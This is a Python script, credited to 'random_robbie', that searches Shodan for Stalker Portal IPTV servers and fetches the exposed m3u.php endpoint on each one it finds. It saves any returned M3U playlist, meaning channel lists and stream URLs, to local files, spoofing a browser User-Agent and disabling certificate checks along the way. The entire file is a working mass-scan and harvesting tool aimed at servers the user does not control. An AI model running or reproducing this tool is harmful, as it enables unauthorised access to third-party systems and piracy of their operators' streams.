#!/usr/bin/env python
#
# stalker-m3u.py
# Search SHODAN for Stalker Portal  IPTV Servers M3U
#
# Author: random_robbie

import shodan
import sys
import re
import requests
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOUR API KEY"
SEARCH_FOR = 'title:"stalker_portal"'
FILE = "/stalker_portal/server/tools/m3u.php"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def grab_file (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		
		URL = "http://"+IP+":"+PORT+""+FILE+""
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0"}
		response = session.get(URL, headers=headers, timeout=15, verify=False)
		result = response.text
		if '#EXTM3U' in result:
			text_file = open("./cfg/stalker-"+IP+".m3u8", "a")
			text_file.write(""+result+"")
			text_file.close()
			print ("[*] Stalker... Found [*]\n")
		else:
			print ("[*] Blocked [*]\n ")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP: "+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_file (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
